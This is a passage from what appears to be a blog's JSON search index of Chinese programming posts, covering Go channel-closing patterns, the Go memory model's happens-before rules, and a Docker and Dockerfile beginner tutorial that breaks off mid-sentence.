:= 0; i < NumReceivers; i++ {\n\t\tgo func(id string) {\n\t\t\tdefer wgReceivers.Done()\n\t\t\t\n\t\t\tfor {\n\t\t\t\t//尝试尽早退出, 这里不能省略, 因为可能会导致多接收一次\n\t\t\t\tselect {\n\t\t\t\tcase <- stopCh:\n\t\t\t\t\treturn\n\t\t\t\tdefault:\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\n\t\t\t\t//注意此处如果 stopCh 关闭了, 下面也有能 return 不了\n                //因为dataCh也有可能select 到, 所以上一个 select语句不能省略\n                \n                \n\t\t\t\tselect {\n\t\t\t\tcase <- stopCh:\n\t\t\t\t\treturn\n\t\t\t\tcase value := <-dataCh:\n\t\t\t\t\tif value == MaxRandomNumber-1 {\n\t\t\t\t\t\t//通知主持人去干关闭的活\n\t\t\t\t\t\tselect {\n\t\t\t\t\t\tcase toStop <- \"receiver#\" + id:\n\t\t\t\t\t\tdefault:\n\t\t\t\t\t\t}\n\t\t\t\t\t\treturn\n\t\t\t\t\t}\n\t\t\t\t\t\n\t\t\t\t\tlog.Println(value)\n\t\t\t\t}\n\t\t\t}\n\t\t}(strconv.Itoa(i))\n\t}\n\t\n\t\n\twgReceivers.Wait()\n\tlog.Println(\"stopped by\", stoppedBy)\n}\n```\n\n\n\n在这个例子中，仍然遵守着*channel closing principle*。 请注意channel `toStop`的缓冲大小是1.这是为了避免当mederator goroutine 准备好之前第一个通知就已经发送了，导致丢失。\n\n\n\n#### **结论**\n\n没有任何场景值得你去打破channel关闭原则，如果你遇到这样的一种特殊场景，还是建议你好好思考一下自己设计，是不是该重构一下了。\n\n\n\n\n\n#### [个人疑问解答](https://www.jianshu.com/p/d24dfbb33781)\n\n楼主你好, 关于第三个例子有些问题请教\n\n1. value==0时, 为什么还要加个select, 不能直接发送给toStop吗?\n\n```\nif value == 0 {\nselect {\ncase toStop <- \"sender#\" + id:\ndefault:\n}\nreturn\n}\n```\n> 因为可能多个生产者或者多个消费者满足条件, 防止阻塞\n\n\n\n2. select stopCh 为什么写了两次? 第一个select可以省略吗?\n\n```\nselect {\ncase <- stopCh:\n\treturn\ndefault:\n}\n\nselect {\ncase <- stopCh:\n\treturn\ncase dataCh <- value:\n}\n```\n> 为了尽早退出, 因为第二个 Select有可能 select 到dataCh, 虽然已经通知关闭了\n\n\n\n3. toStop的缓冲大小是1, 为了避免准备好之前通知就发送了怎么理解??\n\n   请注意channel toStop的缓冲大小是1.这是为了避免当mederator goroutine 准备好之前第一个通知就已经发送了，导致丢失。\n\n> 因为有缓冲的 发送 happens_before 接收之前, 所以mederator能保证接收到数据\n>\n> 无缓冲的 接收 happens_before 发送之间,  可能会丢失数据","tags":["golang"],"categories":["golang"]},{"title":"golang内存模型和happens_before","url":"%2Fp%2F6196d525.html","content":"\n\n\n### happens-before 术语\n\nhappens-before是一个术语，并不仅仅是Go语言才有的。简单的说，通常的定义如下：\n\n假设A和B表示一个多线程的程序执行的两个操作。如果A happens-before B，那么A操作对内存的影响 将对执行B的线程(且执行B之前)可见。 \n\n\n\n+ 无论使用哪种编程语言，有一点是相同的：如果操作A和B在相同的线程中执行，并且A操作的声明在B之前，那么A happens-before B。\n\n```\nint A, B;\nvoid foo()\n{\n  // This store to A ...\n  A = 5;\n  // ... effectively becomes visible before the following loads. Duh!\n  B = A * A;\n}\n```\n\n \n\n+ 还有一点是，在每门语言中，无论你使用那种方式获得，happens-before关系都是可传递的：如果A happens-before B，同时B happens-before C，那么A happens-before C。当这些关系发生在不同的线程中，传递性将变得非常有用。\n\n<!-- more -->\n\n\n\n刚接触这个术语的人总是容易误解，这里必须澄清的是，happens-before并不是指时序关系，并不是说A happens-before B就表示操作A在操作B之前发生。它就是一个术语，就像光年不是时间单位一样。具体地说：\n\n1.  **A happens-before B并不意味着A在B之前发生。**\n2.  **A在B之前发生并不意味着A happens-before B。**\n\n这两个陈述看似矛盾，其实并不是。如果你觉得很困惑，可以多读几篇它的定义。后面我会试着解释这点。记住，happens-before 是一系列语言规范中定义的操作间的关系。它和时间的概念独立。这和我们通常说”A在B之前发生”时表达的真实世界中事件的时间顺序不同。\n\n\n\n### A happens-before B并不意味着A在B之前发生 (编译器可能会重排)\n\n\n\n这里有个例子，其中的操作具有happens-before关系，但是实际上并不一定是按照那个顺序发生的。下面的代码执行了(1)对A的赋值，紧接着是(2)对B的赋值。\n\n```\nint A = 0;\nint B = 0;\nvoid main()\n{\n    A = B + 1; // (1)\n    B = 1; // (2)\n}\n```\n\n\n\n根据前面说明的规则，(1) happens-before (2)。但是，如果我们使用gcc -O2编译这个代码，编译器将产生一些指令重排序。有可能执行顺序是这样子的：\n\n```\n将B的值取到寄存器\n将B赋值为1\n将寄存器值加1后赋值给A\n```\n\n也就是到第二条机器指令(对B的赋值)完成时，对A的赋值还没有完成。换句话说，(1)并没有在(2)之前发生!\n\n那么，这里违反了happens-before关系了吗？让我们来分析下，根据定义，操作(1)对内存的影响必须在操作(2)执行之前对其可见。换句话说，对A的赋值必须有机会对B的赋值有影响.\n\n但是在这个例子中，对A的赋值其实并没有对B的赋值有影响。即便(1)的影响真的可见，(2)的行为还是一样。所以，这并不能算是违背happens-before规则。\n\n\n\n### A在B之前发生并不意味着A happens-before B (虽然在之前发生但不满足规则)\n\n下面这个例子中，所有的操作按照指定的顺序发生，但是并能不构成happens-before 关系。假设一个线程调用pulishMessage，同时，另一个线程调用consumeMessage。 由于我们并行的操作共享变量，为了简单，我们假设所有对int类型的变量的操作都是原子的。\n\n\n\n```\nint isReady = 0;\nint answer = 0;\nvoid publishMessage()\n{\n  answer = 42; // (1)\n  isReady = 1; // (2)\n}\nvoid consumeMessage()\n{\n  if (isReady)\t\t\t    // (3) <-- Let's suppose this line reads 1\n  \tprintf(\"%d\\n\", answer); // (4)\n}\n```\n\n\n\n根据程序的顺序，在(1)和(2)之间存在happens-before 关系，同时在(3)和(4)之间也存在happens-before关系。\n\n\n\n除此之外，我们假设在运行时，isReady读到1(是由另一个线程在(2)中赋的值)。在这中情形下，我们可知(2)一定在(3)之前发生。但是这并不意味着在(2)和(3)之间存在happens-before 关系!\n\nhappens-before 关系只在语言标准中定义的地方存在，这里并没有相关的规则说明(2)和(3)之间存在happens-before关系，即便(3)读到了(2)赋的值。\n\n还有，由于(2)和(3)之间，(1)和(4)之间都不存在happens-before关系，那么(1)和(4)的内存交互也可能被重排序 (要不然来自编译器的指令重排序，要不然来自处理器自身的内存重排序)。那样的话，即使(3)读到1，(4)也会打印出“0“。\n\n \n\n### Go关于同步的规则 (往冰箱放西瓜, 先放后拿,往手里递西瓜, 先接后放)\n\n\n\n关于channel的happens-before在Go的内存模型中提到了三种情况：\n\n- 对一个channel的发送操作 happens-before 相应channel的接收操作完成     \t  **(往冰箱放西瓜, 先放后拿)**\n- 关闭一个channel happens-before 从该Channel接收到最后的返回值0                \n\n- 不带缓冲的channel的接收操作 happens-before 相应channel的发送操作完成      **(往手里递西瓜, 先接后放) **     \n\n\n\n先看一个简单的例子：\n\n```\nvar c = make(chan int, 10)\nvar a string\nfunc f() {\n    a = \"hello, world\"  // (1)\n    c <- 0  // (2)\n}\nfunc main() {\n    go f()\n    <-c   // (3)\n    print(a)  // (4)\n}\n```\n\n上述代码可以确保输出\"hello, world\"，因为(1) happens-before (2)，(4) happens-after (3)，再根据上面的第一条规则(2)是 happens-before (3)的，最后根据happens-before的可传递性，于是有(1) happens-before (4)，也就是a = \"hello, world\" happens-before print(a)。\n\n\n\n再看另一个例子：\n\n```\nvar c = make(chan int)\nvar a string\nfunc f() {\n    a = \"hello, world\"  // (1)\n    <-c   // (2)\n}\nfunc main() {\n    go f()\n    c <- 0  // (3)\n    print(a)  // (4)\n}\n```\n\n根据上面的第三条规则(2) happens-before (3)，最终可以保证(1) happens-before (4)。\n\n\n\n\n\n如果我把上面的代码稍微改一点点，将c变为一个带缓存的channel，则print(a)打印的结果不能够保证是\"hello world\"。\n\n```\nvar c = make(chan int, 1)\nvar a string\nfunc f() {\n    a = \"hello, world\"  // (1)\n    <-c   // (2)\n}\nfunc main() {\n    go f()\n    c <- 0  // (3)\n    print(a)  // (4)\n}\n```\n\n因为这里不再有任何同步保证，使得(2) happens-before (3)。可以回头分析一下本节最前面的例子，也是没有保证happens-before条件。\n\n\n\n\n\n### golang happen before 的保证\n\n\n\n**1) 单线程**\n\n\n\n**2) Init 函数**\n\n- 如果包P1中导入了包P2，则P2中的init函数Happens Before 所有P1中的操作\n- main函数Happens After 所有的init函数\n\n\n\n3) **Goroutine**\n\n- Goroutine的创建Happens Before所有此Goroutine中的操作\n- Goroutine的销毁Happens After所有此Goroutine中的操作\n\n\n\n **4) Channel**\n\n- 对一个元素的send操作Happens Before对应的receive 完成操作\n- 对channel的close操作Happens Before receive 端的收到关闭通知操作\n- 对于Unbuffered Channel，对一个元素的receive 操作Happens Before对应的send完成操作\n- 对于Buffered Channel，假设Channel 的buffer 大小为C，那么对第k个元素的receive操作，Happens Before第k+C个send完成操作。可以看出上一条Unbuffered Channel规则就是这条规则C=0时的特例\n\n\n\n**5) Lock**\n\nGo里面有Mutex和RWMutex两种锁，RWMutex除了支持互斥的Lock/Unlock，还支持共享的RLock/RUnlock。\n\n- 对于一个Mutex/RWMutex，设n < m，则第n个Unlock操作Happens Before第m个Lock操作。\n- 对于一个RWMutex，存在数值n，RLock操作Happens After 第n个UnLock，其对应的RUnLock Happens Before 第n+1个Lock操作。\n\n*简单理解就是这一次的Lock总是Happens After上一次的Unlock，读写锁的RLock HappensAfter上一次的UnLock，其对应的RUnlock Happens Before 下一次的Lock。*\n\n```\nvar l sync.Mutex\nvar a string\nfunc f() {\n    a = \"hello, world\" // (1)\n    l.Unlock() // (2)\n}\nfunc main() {\n    l.Lock() // (3)\n    go f()\n    l.Lock() // (4)\n    print(a) // (5)\n}\n```\n\n(1) happens-before (2) happens-before (4) happens-before (5)\n\n\n\n**6) Once**\n\nonce.Do中执行的操作，Happens Before 任何一个once.Do调用的返回。","tags":["golang"],"categories":["golang"]},{"title":"docker基础入门教程","url":"%2Fp%2Fa12c5ca5.html","content":"\n\n\n0. 基本概念\n\n- 镜像\n\n镜像包含操作系统完整的 root 文件系统，其体积往往是庞大的，因此在 Docker 设计时，就充分利用 Union FS 的技术，将其设计为分层存储的架构。所以严格来说，镜像并非是像一个 ISO 那样的打包文件，镜像只是一个虚拟的概念，其实际体现并非由一个文件组成，而是由一组文件系统组成，或者说，由多层文件系统联合组成。\n\n- 容器\n\n每一个容器运行时，是以镜像为基础层，在其上创建一个当前容器的存储层，我们可以称这个为容器运行时读写而准备的存储层为容器存储层。\n\n\n\n容器不应该向其存储层内写入任何数据，容器存储层要保持无状态化。所有的文件写入操作，都应该使用 数据卷（Volume）、或者绑定宿主目录，在这些位置的读写会跳过容器存储层，直接对宿主（或网络存储）发生读写，其性能和稳定性更高。\n\n数据卷的生存周期独立于容器，容器消亡，数据卷不会消亡。因此，使用数据卷后，容器删除或者重新运行之后，数据却不会丢失。\n\n<!-- more -->\n\n- 仓库\n\n一个仓库会包含同一个软件不同版本的镜像，而标签就常用于对应该软件的各个版本。我们可以通过 <仓库名>:<标签> 的格式来指定具体是这个软件哪个版本的镜像。如果不给出标签，将以 latest 作为默认标签。\n\n\n\n以 Ubuntu 镜像 为例，ubuntu 是仓库的名字，其内包含有不同的版本标签，如，14.04, 16.04。我们可以通过 ubuntu:14.04，或者 ubuntu:16.04 来具体指定所需哪个版本的镜像。如果忽略了标签，比如 ubuntu，那将视为 ubuntu:latest。\n\n\n\n仓库名经常以 两段式路径 形式出现，比如 jwilder/nginx-proxy，前者往往意味着 Docker Registry 多用户环境下的用户名，后者则往往是对应的软件名。但这并非绝对，取决于所使用的具体 Docker Registry 的软件或服务。\n\n\n\n1. 使用镜像\n\n1.1 获取镜像\n\n    docker pull [选项] [Docker Registry 地址[:端口号]/]仓库名[:标签]\n\n- Docker 镜像仓库地址：地址的格式一般是 <域名/IP>[:端口号]。默认地址是 Docker Hub。\n- 仓库名：如之前所说，这里的仓库名是两段式名称，即 <用户名>/<软件名>。对于 Docker Hub，如果不给出用户名，则默认为 library，也就是官方镜像。\n\n    docker pull ubuntu:16.04\n    16.04: Pulling from library/ubuntu\n\n\n\n1.2 运行容器\n\n    docker run -it --rm \\\n        ubuntu:16.04 \\\n        bash\n\n- -it：这是两个参数，一个是 -i：交互式操作，一个是 -t 终端。我们这里打算进入 bash 执行一些命令并查看返回结果，因此我们需要交互式终端。\n- --rm：这个参数是说容器退出后随之将其删除。默认情况下，为了排障需求，退出的容器并不会立即删除，除非手动 docker rm。我们这里只是随便执行个命令，看看结果，不需要排障和保留结果，因此使用 --rm 可以避免浪费空间。\n- ubuntu:16.04：这是指用 ubuntu:16.04 镜像为基础来启动容器。\n- bash：放在镜像名后的是命令，这里我们希望有个交互式 Shell，因此用的是 bash\n\n\n\n1.3 列出镜像\n\n    docker images\n\n列表包含了 仓库名、标签、镜像 ID、创建时间 以及 所占用的空间。\n\n镜像 ID 则是镜像的唯一标识，一个镜像可以对应多个标签。\n\n\n\n1.4 虚悬镜像\n\n docker pull 可能导致这种情况，docker build 也同样可以导致这种现象。由于新旧镜像同名，旧镜像名称被取消，从而出现仓库名、标签均为 <none> 的镜像。这类无标签镜像也被称为 虚悬镜像(dangling image)\n\n\n\n一般来说，虚悬镜像已经失去了存在的价值，是可以随意删除的，可以用下面的命令删除。\n\n    docker image prune\n\n\n\n1.4 删除本地镜像\n\n如果要删除本地的镜像，可以使用 docker image rm 命令，其格式为：\n\n    $ docker image rm [选项] <镜像1> [<镜像2> ...]\n\n \n\n\n2. Dockerfile 定制镜像\n\nDockerfile 是一个文本文件，其内包含了一条条的指令(Instruction)，每一条指令构建一层，因此每一条指令的内容，就是描述该层应当如何构建。\n\n\n\n2.1 构建镜像\n\n在 Dockerfile 文件所在目录执行：\n\n    $ docker build -t nginx:v3 .\n\n\n\n这里我们使用了 docker build 命令进行镜像构建。其格式为：\n\n    docker build [选项] <上下文路径/URL/->\n\n\n\n2.2 镜像构建上下文（Context） 上下文路径就是 docker build 指定的\n\n如果注意，会看到 docker build 命令最后有一个 .。. 表示当前目录，而 Dockerfile 就在当前目录，因此不少初学者以为这个路径是在指定 Dockerfile 所在路径，这么理解其实是不准确的。如果对应上面的命令格式，你可能会发现，这是在指定上下文路径。那么什么是上下文呢？\n\n\n\n首先我们要理解 docker build 的工作原理。Docker 在运行时分为 Docker 引擎（也就是服务端守护进程）和客户端工具。Docker 的引擎提供了一组 REST API，被称为 Docker Remote API，而如 docker 命令这样的客户端工具，则是通过这组 API 与 Docker 引擎交互，从而完成各种功能。因此，虽然表面上我们好像是在本机执行各种 docker 功能，但实际上，一切都是使用的远程调用形式在服务端（Docker 引擎）完成。也因为这种 C/S 设计，让我们操作远程服务器的 Docker 引擎变得轻而易举。\n\n\n\n当我们进行镜像构建的时候，并非所有定制都会通过 RUN 指令完成，经常会需要将一些本地文件复制进镜像，比如通过 COPY 指令、ADD 指令等。而 docker build 命令构建镜像，其实并非在本地构建，而是在服务端，也就是 Docker 引擎中构建的。那么在这种客户端/服务端的架构中，如何才能让服务端获得本地文件呢？\n\n \n\n这就引入了上下文的概念。当构建的时候，用户会指定构建镜像上下文的路径，docker build 命令得知这个路径后，会将路径下的所有内容打包，然后上传给 Docker 引擎。这样 Docker 引擎收到这个上下文包后，展开就会获得构建镜像所需的一切文件。\n\n\n\n如果在 Dockerfile 中这么写：\n\n    COPY ./package.json /app/ \n\n这并不是要复制执行 docker build 命令所在的目录下的 package.json，也不是复制 Dockerfile 所在目录下的 package.json，而是复制 上下文（context） 目录下的 package.json。\n\n \n\n因此，COPY 这类指令中的源文件的路径都是相对路径。这也是初学者经常会问的为什么 COPY ../package.json /app 或者 COPY /opt/xxxx /app 无法工作的原因，因为这些路径已经超出了上下文的范围，Docker 引擎无法获得这些位置的文件。如果真的需要那些文件，应该将它们复制到上下文目录中去。\n\n\n\n现在就可以理解刚才的命令 docker build -t nginx:v3 . 中的这个 .，实际上是在指定上下文的目录，docker build 命令会将该目录下的内容打包交给 Docker 引擎以帮助构建镜像。\n\n\n\n 理解构建上下文对于镜像构建是很重要的，避免犯一些不应该的错误。比如有些初学者在发现 COPY /opt/xxxx /app 不工作后，于是干脆将 Dockerfile 放到了硬盘根目录去构建，结果发现 docker build 执行后，在发送一个几十 GB 的东西，极为缓慢而且很容易构建失败。那是因为这种做法是在让 docker build 打包整个硬盘，这显然是使用错误。\n\n\n\n一般来说，应该会将 Dockerfile 置于一个空目录下，或者项目根目录下。如果该目录下没有所需文件，那么应该把所需文件复制一份过来。如果目录下有些东西确实不希望构建时传给 Docker 引擎，那么可以用 .gitignore 一样的语法写一个 .dockerignore，该文件是用于剔除不需要作为上下文传递给 Docker 引擎的。 \n\n\n\n那么为什么会有人误以为 . 是指定 Dockerfile 所在目录呢？这是因为在默认情况下，如果不额外指定 Dockerfile 的话，会将上下文目录下的名为 Dockerfile 的文件作为 Dockerfile。\n\n\n\n这只是默认行为，实际上 Dockerfile 的文件名并不要求必须为 Dockerfile，而且并不要求必须位于上下文目录中，比如可以用 -f ../Dockerfile.php 参数指定某个文件作为 Dockerfile。\n\n \n\n当然，一般大家习惯性的会使用默认的文件名 Dockerfile，以及会将其置于镜像构建上下文目录中。\n\n\n\n\n\n2.3 dockerfile 指令\n\n\n\n- FROM 指定基础镜像\n\n所谓定制镜像，那一定是以一个镜像为基础，在其上进行定制。就像我们之前运行了一个 nginx 镜像的容器，再进行修改一样，基础镜像是必须指定的。而 FROM 就是指定基础镜像，因此一个 Dockerfile 中 FROM 是必备的指令，并且必须是第一条指令。\n\n在 Docker Store 上有非常多的高质量的官方镜像，有可以直接拿来使用的服务类的镜像，如 nginx、redis、mongo、mysql、httpd、php、tomcat 等；也有一些方便开发、构建、运行各种语言应用的镜像，如 node、openjdk、python、ruby、golang 等。可以在其中寻找一个最符合我们最终目标的镜像为基础镜像进行定制。\n\n\n\n如果没有找到对应服务的镜像，官方镜像中还提供了一些更为基础的操作系统镜像，如 ubuntu、debian、centos、fedora、alpine 等，这些操作系统的软件库为我们提供了更广阔的扩展空间。\n\n除了选择现有镜像为基础镜像外，Docker 还存在一个特殊的镜像，名为 scratch。这个镜像是虚拟的概念，并不实际存在，它表示一个空白的镜像。\n\n- RUN 执行命令\n\nRUN 指令是用来执行命令行命令的。由于命令行的强大能力，RUN 指令在定制镜像时是最常用的指令之一。其格式有两种：\n\n- shell 格式：RUN <命令>，就像直接在命令行中输入的命令一样。刚才写的 Dockerfile 中的 RUN 指令就是这种格式。\n\n    RUN echo '<h1>Hello, Docker!</h1>' > /usr/share/nginx/html/index.html\n\n- exec 格式：RUN [\"可执行文件\", \"参数1\", \"参数2\"]，这更像是函数调用中的格式。\n\n \n\n之前说过，Dockerfile 中每一个指令都会建立一层，RUN 也不例外。每一个 RUN 的行为，就和刚才我们手工建立镜像的过程一样：新建立一层，在其上执行这些命令，执行结束后，commit 这一层的修改，构成新的镜像。\n\n\n\n    FROM debian:jessie\n    \n    RUN buildDeps='gcc libc6-dev make' \\\n        && apt-get update \\\n        && apt-get install -y $buildDeps \\\n        && wget -O redis.tar.gz \"http://download.redis.io/releases/redis-3.2.5.tar.gz\" \\\n        && mkdir -p /usr/src/redis \\\n        && tar -xzf redis.tar.gz -C /usr/src/redis --strip-components=1 \\\n        && make -C /usr/src/redis \\\n        && make -C /usr/src/redis install \\\n        && rm -rf /var/lib/apt/lists/* \\\n        && rm redis.tar.gz \\\n        && rm -r /usr/src/redis \\\n        && apt-get purge -y --auto-remove $buildDeps\n\n\n\n 首先，之前所有的命令只有一个目的，就是编译、安装 redis 可执行文件。因此没有必要建立很多层，这只是一层的事情。因此，这里没有使用很多个 RUN 对一一对应不同的命令，而是仅仅使用一个 RUN 指令，并使用 && 将各个所需命令串联起来。将之前的 7 层，简化为了 1 层。在撰写 Dockerfile 的时候，要经常提醒自己，这并不是在写 Shell 脚本，而是在定义每一层该如何构建。\n\n\n\n并且，这里为了格式化还进行了换行。Dockerfile 支持 Shell 类的行尾添加 \\ 的命令换行方式，以及行首 # 进行注释的格式。良好的格式，比如换行、缩进、注释等，会让维护、排障更为容易，这是一个比较好的习惯。\n\n  \n\n此外，还可以看到这一组命令的最后添加了清理工作的命令，删除了为了编译构建所需要的软件，清理了所有下载、展开的文件，并且还清理了 apt 缓存文件。这是很重要的一步，我们之前说过，镜像是多层存储，每一层的东西并不会在下一层被删除，会一直跟随着镜像。因此镜像构建时，一定要确保每一层只添加真正需要添加的东西，任何无关的东西都应该清理掉。\n\n\n\n- COPY 复制文件\n\n格式：\n\n- COPY <源路径>... <目标路径>\n- COPY [\"<源路径1>\",... \"<目标路径>\"]\n\n\n\nCOPY 指令将从构建上下文目录中 <源路径> 的文件/目录复制到新的一层的镜像内的 <目标路径> 位置。比如：\n\n    COPY package.json /usr/src/app/\n\n<源路径> 可以是多个，甚至可以是通配符，其通配符规则要满足 Go 的 filepath.Match 规则，如：\n\n    COPY hom* /mydir/\n    COPY hom?.txt /mydir/\n\n\n\n<目标路径> 可以是容器内的绝对路径，也可以是相对于工作目录的相对路径（工作目录可以用 WORKDIR指令来指定）。目标路径不需要事先创建，如果目录不存在会在复制文件前先行创建缺失目录。\n\n此外，还需要注意一点，使用 COPY 指令，源文件的各种元数据都会保留。比如读、写、执行权限、文件变更时间等。这个特性对于镜像定制很有用。特别是构建相关文件都在使用 Git 进行管理的时候。\n\n\n\n- ADD 更高级的复制文件\n\nADD 指令和 COPY 的格式和性质基本一致。但是在 COPY 基础上增加了一些功能。\n\n\n\n 比如 <源路径> 可以是一个 URL，这种情况下，Docker 引擎会试图去下载这个链接的文件放到 <目标路径> 去。下载后的文件权限自动设置为 600，如果这并不是想要的权限，那么还需要增加额外的一层 RUN进行权限调整，另外，如果下载的是个压缩包，需要解压缩，也一样还需要额外的一层 RUN 指令进行解压缩。所以不如直接使用 RUN 指令，然后使用 wget 或者 curl 工具下载，处理权限、解压缩、然后清理无用文件更合理。因此，这个功能其实并不实用，而且不推荐使用。\n\n\n\n- CMD 容器启动命令 \n\nCMD 指令的格式和 RUN 相似，也是两种格式：\n\n- shell 格式：CMD <命令>\n- exec 格式：CMD [\"可执行文件\", \"参数1\", \"参数2\"...]\n- 参数列表格式：CMD [\"参数1\", \"参数2\"...]。在指定了 ENTRYPOINT 指令后，用 CMD 指定具体的参数。\n  \n\n之前介绍容器的时候曾经说过，Docker 不是虚拟机，容器就是进程。既然是进程，那么在启动容器的时候，需要指定所运行的程序及参数。CMD 指令就是用于指定默认的容器主进程的启动命令的。\n\n \n\n在运行时可以指定新的命令来替代镜像设置中的这个默认命令，比如，ubuntu 镜像默认的 CMD 是 /bin/bash，如果我们直接 docker run -it ubuntu 的话，会直接进入 bash。我们也可以在运行时指定运行别的命令，如 docker run -it ubuntu cat /etc/os-release。这就是用 cat /etc/os-release 命令替换了默认的 /bin/bash 命令了，输出了系统版本信息。\n\n\n\n在指令格式上，一般推荐使用 exec 格式，这类格式在解析时会被解析为 JSON 数组，因此一定要使用双引号 \"，而不要使用单引号。\n\n\n\n如果使用 shell 格式的话，实际的命令会被包装为 sh -c 的参数的形式进行执行。比如：\n\n    CMD echo $HOME\n\n在实际执行中，会将其变更为：\n\n    CMD [ \"sh\", \"-c\", \"echo $HOME\" ]\n\n这就是为什么我们可以使用环境变量的原因，因为这些环境变量会被 shell 进行解析处理。\n\n\n\n提到 CMD 就不得不提容器中应用在前台执行和后台执行的问题。这是初学者常出现的一个混淆。\n\nDocker 不是虚拟机，容器中的应用都应该以前台执行，而不是像虚拟机、物理机里面那样，用 upstart/systemd 去启动后台服务，容器内没有后台服务的概念。\n\n一些初学者将 CMD 写为：\n\n    CMD service nginx start\n\n然后发现容器执行后就立即退出了。甚至在容器内去使用 systemctl 命令结果却发现根本执行不了。这就是因为没有搞明白前台、后台的概念，没有区分容器和虚拟机的差异，依旧在以传统虚拟机的角度去理解容器。   \n\n对于容器而言，其启动程序就是容器应用进程，容器就是为了主进程而存在的，主进程退出，容器就失去了存在的意义，从而退出，其它辅助进程不是它需要关心的东西。\n\n \n\n而使用 service nginx start 命令，则是希望 upstart 来以后台守护进程形式启动 nginx 服务。而刚才说了 CMD service nginx start 会被理解为 CMD [ \"sh\", \"-c\", \"service nginx start\"]，因此主进程实际上是 sh。那么当 service nginx start 命令结束后，sh 也就结束了，sh 作为主进程退出了，自然就会令容器退出。\n\n正确的做法是直接执行 nginx 可执行文件，并且要求以前台形式运行。比如：\n\n    CMD [\"nginx\", \"-g\", \"daemon off;\"]\n\n\n\n- ENTRYPOINT 入口点\n\nENTRYPOINT 的目的和 CMD 一样，都是在指定容器启动程序及参数。ENTRYPOINT 在运行时也可以替代，不过比 CMD 要略显繁琐，需要通过 docker run 的参数 --entrypoint 来指定。\n\n \n\n当指定了 ENTRYPOINT 后，CMD 的含义就发生了改变，不再是直接的运行其命令，而是将 CMD 的内容作为参数传给 ENTRYPOINT 指令，换句话说实际执行时，将变为：\n\n    <ENTRYPOINT> \"<CMD>\"\n\n那么有了 CMD 后，为什么还要有 ENTRYPOINT 呢？这种 <ENTRYPOINT> \"<CMD>\" 有什么好处么？让我们来看几个场景。\n\n\n\n- 场景一：让镜像变成像命令一样使用\n\n假设我们需要一个得知自己当前公网 IP 的镜像，那么可以先用 CMD 来实现：\n\n    FROM ubuntu:16.04\n    RUN apt-get update \\\n        && apt-get install -y curl \\\n        && rm -rf /var/lib/apt/lists/*\n    CMD [ \"curl\", \"-s\", \"http://ip.cn\" ]\n\n假如我们使用 docker build -t myip . 来构建镜像的话，如果我们需要查询当前公网 IP，只需要执行：\n\n    $ docker run myip\n    当前 IP：61.148.226.66 来自：北京市 联通\n\n嗯，这么看起来好像可以直接把镜像当做命令使用了，不过命令总有参数，如果我们希望加参数呢？比如从上面的 CMD 中可以看到实质的命令是 curl，那么如果我们希望显示 HTTP 头信息，就需要加上 -i 参数。那么我们可以直接加 -i 参数给 docker run myip 么？\n\n    $ docker run myip -i\n    docker: Error response from daemon: invalid header field value \"oci runtime error: container_linux.go:247: starting container process caused \\\"exec: \\\\\\\"-i\\\\\\\": executable file not found in $PATH\\\"\\n\".\n\n我们可以看到可执行文件找不到的报错，executable file not found。之前我们说过，跟在镜像名后面的是 command，运行时会替换 CMD 的默认值。因此这里的 -i 替换了原来的 CMD，而不是添加在原来的 curl -s http://ip.cn 后面。而 -i 根本不是命令，所以自然找不到。\n\n\n\n现在我们重新用 ENTRYPOINT 来实现这个镜像：\n\n    FROM ubuntu:16.04\n    RUN apt-get update \\\n        && apt-get install -y curl \\\n        && rm -rf /var/lib/apt/lists/*\n    ENTRYPOINT [ \"curl\", \"-s\", \"http://ip.cn\" ]\n\n这次我们再来尝试直接使用 docker run myip -i：\n\n    $ docker run myip\n    当前 IP：61.148.226.66 来自：北京市 联通\n    \n    $ docker run myip -i\n    HTTP/1.1 200 OK\n    Server: nginx/1.8.0\n    Date: Tue, 22 Nov 2016 05:12:40 GMT\n    Content-Type: text/html; charset=UTF-8\n    Vary: Accept-Encoding\n    X-Powered-By: PHP/5.6.24-1~dotdeb+7.1\n    X-Cache: MISS from cache-2\n    X-Cache-Lookup: MISS from cache-2:80\n    X-Cache: MISS from proxy-2_6\n    Transfer-Encoding: chunked\n    Via: 1.1 cache-2:80, 1.1 proxy-2_6:8006\n    Connection: keep-alive\n    \n    当前 IP：61.148.226.66 来自：北京市 联通\n\n可以看到，这次成功了。这是因为当存在 ENTRYPOINT 后，CMD 的内容将会作为参数传给 ENTRYPOINT，而这里 -i 就是新的 CMD，因此会作为参数传给 curl，从而达到了我们预期的效果。 \n\n  \n\n- 场景二：应用运行前的准备工作\n\n 启动容器就是启动主进程，但有些时候，启动主进程前，需要一些准备工作。\n\n比如 mysql 类的数据库，可能需要一些数据库配置、初始化的工作，这些工作要在最终的 mysql 服务器运行之前解决。\n\n此外，可能希望避免使用 root 用户去启动服务，从而提高安全性，而在启动服务前还需要以 root 身份执行一些必要的准备工作，最后切换到服务用户身份启动服务。或者除了服务外，其它命令依旧可以使用 root 身份执行，方便调试等。\n\n这些准备工作是和容器 CMD 无关的，无论 CMD 为什么，都需要事先进行一个预处理的工作。这种情况下，可以写一个脚本，然后放入 ENTRYPOINT 中去执行，而这个脚本会将接到的参数（也就是 <CMD>）作为命令，在脚本最后执行。比如官方镜像 redis 中就是这么做的：\n\n    FROM alpine:3.4\n    ...\n    RUN addgroup -S redis && adduser -S -G redis redis\n    ...\n    ENTRYPOINT [\"docker-entrypoint.sh\"]\n    \n    EXPOSE 6379\n    CMD [ \"redis-server\" ] \n\n\n\n- ENV 设置环境变量\n\n格式有两种：\n\n- ENV <key> <value>\n- ENV <key1>=<value1> <key2>=<value2>...\n  \n\n这个指令很简单，就是设置环境变量而已，无论是后面的其它指令，如 RUN，还是运行时的应用，都可以直接使用这里定义的环境变量。\n\n    ENV NODE_VERSION 7.2.0\n    \n    RUN curl -SLO \"https://nodejs.org/dist/v$NODE_VERSION/node-v$NODE_VERSION-linux-x64.tar.xz\" \\\n      && curl -SLO \"https://nodejs.org/dist/v$NODE_VERSION/SHASUMS256.txt.asc\" \\\n\n\n\n\n下列指令可以支持环境变量展开： ADD、COPY、ENV、EXPOSE、LABEL、USER、WORKDIR、VOLUME、STOPSIGNAL、ONBUILD。\n\n\n\n- ARG 构建参数(构建环境的环境变量)\n\n格式：ARG <参数名>[=<默认值>]\n\n构建参数和 ENV 的效果一样，都是设置环境变量。所不同的是，ARG 所设置的构建环境的环境变量，在将来容器运行时是不会存在这些环境变量的。但是不要因此就使用 ARG 保存密码之类的信息，因为 docker history 还是可以看到所有值的。\n\nDockerfile 中的 ARG 